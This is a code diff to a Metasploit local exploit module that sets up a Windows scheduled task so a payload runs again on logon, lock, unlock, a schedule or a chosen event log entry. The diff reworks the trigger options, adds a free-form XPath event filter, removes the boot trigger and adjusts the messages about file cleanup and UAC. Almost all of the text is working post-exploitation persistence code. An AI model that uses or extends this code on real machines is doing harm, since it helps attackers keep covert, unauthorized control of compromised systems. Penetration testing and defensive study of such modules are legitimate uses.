@@ -46,20 +46,19 @@ class Metasploit3 < Msf::Exploit::Local
 
 		register_options(
 			[
-				OptInt.new('FREQUENCY', [false, 'Frequency in minutes to execute', '']),
+				OptInt.new('FREQUENCY', [false, 'Schedule trigger: Frequency in minutes to execute', '']),
 				OptInt.new('EXPIRE_TIME', [false, 'Number of minutes until task expires', '']),
-				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'logon',['logon', 'lock', 'unlock','schedule', 'boot', 'event', 'version']]),
+				OptEnum.new('TRIGGER', [true, 'Payload trigger method', 'logon',['logon', 'lock', 'unlock','schedule', 'event', 'version']]),
 				OptString.new('REXENAME',[false, 'Name of exe on remote system', '']),
 				OptString.new('PATH',[false, 'PATH to write payload', '']),
+				OptString.new('EVENT_LOG', [false, 'Event trigger: The event log to check for event','']),
+				OptInt.new('EVENT_ID', [false, 'Event trigger: Event ID to trigger on.','']),
 			], self.class)
 
 		register_advanced_options(
 			[
-				OptString.new('EVENT_LOG', [false, 'The event log to check for event','']),
-				#OptString.new('PROVIDER', [false, 'The provider name assigned to the event','']),
-				OptInt.new('EVENT_ID', [false, 'Event ID to trigger on.','']),
-				OptString.new('EVENTDATA_NAME', [false, 'Data Name from tag with EventData','']),
-				OptString.new('EVENTDATA_VALUE', [false, 'Value of the Data Name','']),
+
+				OptString.new('XPATH', [false, 'XPath query','']),
 			], self.class)
 	end
 
@@ -244,21 +243,10 @@ class Metasploit3 < Msf::Exploit::Local
 			when 'unlock'
 				xml = create_trigger_tags("SessionUnlock", xml)
 
-			when 'boot'
-				# Create XML to query system event log and check for event Kernel-General
-				# with event ID 12 (Computer start)
-
-				# Microsoft-Windows-Kernel-General
-				# 12
-				# Application
-				# level 4
-				line = "(EventID=12) and *[System[Provider[@Name='Microsoft-Windows-Kernel-General']]]"
-				xml = create_trigger_event_tags("Application", line, xml)
-
 			when 'event'
 				line = "*[System[(EventID=#{datastore['EVENT_ID']})]]"
-				if not datastore['EVENTDATA_NAME'].empty? and not datastore['EVENTDATA_VALUE'].empty?
-					line << " and *[EventData[(Data[@Name='#{datastore['EVENTDATA_NAME']}'] ='#{datastore['EVENTDATA_VALUE']}')]]"
+				if not datastore['XPATH'].empty?
+					line << " and #{datastore['XPATH']}"
 				end
 				vprint_status("\tPayload will trigger on #{line}")
 
@@ -312,7 +300,7 @@ class Metasploit3 < Msf::Exploit::Local
 		begin
 			session.fs.file.rm(path)
 		rescue
-			print_error("Could not delete file #{path}")
+			print_warning("Could not delete file #{path}, delete manually")
 			return false
 		end
 		return true
@@ -333,6 +321,9 @@ class Metasploit3 < Msf::Exploit::Local
 			return true
 		else
 			print_error("Issues creating task using XML file schtasks")
+			if datastore['EVENT_LOG'] == 'Security'
+				print_warning("Security log can restricted by UAC, try a different trigger")
+			end
 			delete_file(rexe_path)
 			delete_file(path)
 			return false
